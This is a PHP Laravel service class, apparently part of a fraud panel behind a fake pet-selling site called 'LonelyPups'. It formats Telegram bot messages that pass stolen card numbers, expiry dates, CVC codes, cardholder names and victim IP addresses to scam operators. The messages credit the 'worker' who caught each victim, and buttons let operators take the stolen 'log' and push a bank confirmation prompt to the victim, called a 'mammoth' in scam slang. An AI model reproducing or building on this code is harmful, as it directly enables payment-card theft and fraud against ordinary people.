<?php

namespace App\Http\Services\API\Telegram;

use App\Http\Services\OrderServices;
use Illuminate\Support\Facades\DB;
use Log;
use App\Models\Course;
use Illuminate\Support\Facades\Cookie;

class TextController
{
    private static function unshuffleId($shuffledId)
    {
        $order = [6, 0, 1, 2, 3, 4, 5];
        $unshuffled = array_fill(0, 7, null);
        for ($i = 0; $i < 7; $i++) {
            $unshuffled[$order[$i]] = $shuffledId[$i];
        }
        return intval(implode('', $unshuffled), 10);
    }

    public static function getMenuCard($order, $user_ip, $price = null)
    {
        $basket_info = is_array($order->basket_info) ? $order->basket_info : json_decode($order->basket_info, true);

        if (isset($basket_info["delivery_price"])) {
            $basket_info["delivery_price"] = $basket_info["delivery_price"];
            $order->basket_info = json_encode($basket_info, true);
        }

        $worker_id = request()->cookie('worker');
        $txt = "#ID_" . $order["id"] . "\n";
        $txt .= '💡 Площадка: LonelyPups 🐶' . "\n";
        $txt .= "\n";
        $txt .= '💳 Номер карты: ' . $order->card . "\n";
        // $txt .= '🏦 Банк: ' . ($order->card_info["bank"] ? $order->card_info["bank"]["name"] : "-") . "\n";
        $txt .= '📅 Срок действия: ' . $order->card_et . "\n";
        $txt .= '🔐 CVC: ' . $order->card_cvc . "\n";
        $txt .= '😊 Держатель карты: ' . $order->card_name . "\n";
        $txt .= "\n";
        $txt .= '💵 Цена: ' . (isset($basket_info["delivery_price"]) ? $basket_info["delivery_price"] . "€" : $basket_info["all_sum"] . '€') . "\n";
        if ($worker_id) {
            $data = DB::connection('mysql2')->table('user')->where('tgId', $worker_id)->first();
            if ($data) {
                $txt .= '👤 Worker: <a href="tg://user?id=' . $worker_id . '">' . $data->firstName . '</a>';
            }
        }
        $txt .= "\n";
        $txt .= "🗺 IP: " . $user_ip . "\n";
        $keyb = [
            [
                [
                    'text' => 'Взять лог',
                    'callback_data' => "log take " . $order->id . "",
                ]
            ]
        ];
        if ($order->vbiverId !== null) {
            return [
                [
                    [
                        'text' => 'PUSH',
                        'callback_data' => "log redirect push " . $order->id . "",
                    ]
                ]
            ];
        }
        return [
            'text' => $txt,
            'parse_mode' => "html",
            'reply_markup' => json_encode([
                'inline_keyboard' => $keyb
            ])
        ];
    }


    public static function code($order, $code)
    {
        $texxt = "#ID_" . $order["id"] . "\n\n";
        if ($code) {
            $texxt .= "📲 PUSH: " . $code;
        } else {
            $texxt .= "⚡️ Мамонт тапнул";
        }

        return [
            'text' => $texxt,
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    [
                        [
                            'text' => 'Закрыть',
                            'callback_data' => "deleteThisMessage",
                        ]
                    ]
                ]
            ])
        ];
    }
}
